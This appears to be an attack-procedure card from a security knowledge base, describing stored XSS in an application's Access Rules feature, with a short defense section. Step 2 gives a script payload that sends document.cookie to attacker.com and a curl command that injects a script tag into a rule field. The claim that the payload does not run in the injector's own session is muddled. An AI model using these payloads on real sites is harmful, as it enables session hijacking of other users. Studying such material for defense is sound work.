---
id: proc-123905-inject-xss
tags:
  - xss
  - stored-xss
  - injection
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:15:26.856Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-Stored-XSS-in-Access-Rules

## Summary

This procedure exploits insufficient input sanitization in the Veris Access Rules feature to store a malicious JavaScript payload, which persists and can be triggered by other users viewing the rules.

## Description

In the Veris application, the Access Rules functionality allows users to define and edit rules for access control. Due to lack of proper output encoding or input validation, attackers with edit permissions can inject HTML/JavaScript payloads into rule fields (e.g., name or description). The payload is stored in the backend and rendered unsafely when other users access the rules page, leading to execution in their browser context. This can result in session hijacking, keylogging, or data exfiltration. The vulnerability was reported on HackerOne in 2016 and affects web browsers with JavaScript enabled.

## Requirements

1. Authenticated access to Veris with permissions to create/edit Access Rules
2. Knowledge of the application's rule submission endpoint (typically a POST to /access-rules or similar)
3. Target users who will view the rules (e.g., admins or other authenticated users)

## Defense

Defensive measures and detection strategies:

- Implement strict Content Security Policy (CSP) to restrict inline scripts
- Sanitize all user inputs using libraries like DOMPurify and encode outputs with HTML entity encoding
- Monitor for unusual JavaScript execution or outbound requests from the application

## Objectives

1. Persist malicious code in the application's database via Access Rules
2. Achieve execution when rules are viewed by victims
3. Enable client-side attacks like cookie theft or phishing

## Instructions

### Step 1: Authenticate and Navigate

**Context**: Log in to the Veris application and access the Access Rules management page to prepare for payload injection.

Navigate to the rules editing interface, typically at a URL like https://veris.example.com/access-rules/edit.

### Step 2: Craft and Submit Payload

**Context**: Create a JavaScript payload that evades basic filters and performs the desired action, such as stealing cookies.

Use a payload like: `<script>var i=new Image();i.src='http://attacker.com/log?cookie='+document.cookie;</script>`.

Submit via the form, intercepting with a proxy if needed to ensure the payload is not altered. For example, using a browser or tool to POST the data:

```bash
curl -X POST https://veris.example.com/access-rules \
  -H "Cookie: session=your_session" \
  -d "rule_name=<script>alert('XSS')</script>&description=Test Rule"
```

> This command simulates form submission; adjust fields based on actual form parameters. Expected output: HTTP 200 or redirect confirming rule creation, with payload stored.

### Step 3: Verify Storage

**Context**: Confirm the payload is stored by viewing the rules as the injector.

Refresh the Access Rules list page. The payload should render without execution in your own session if same-origin policy applies, but visible in HTML source.

Inspect the page source to see the unescaped script tag.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[stored-xss]]
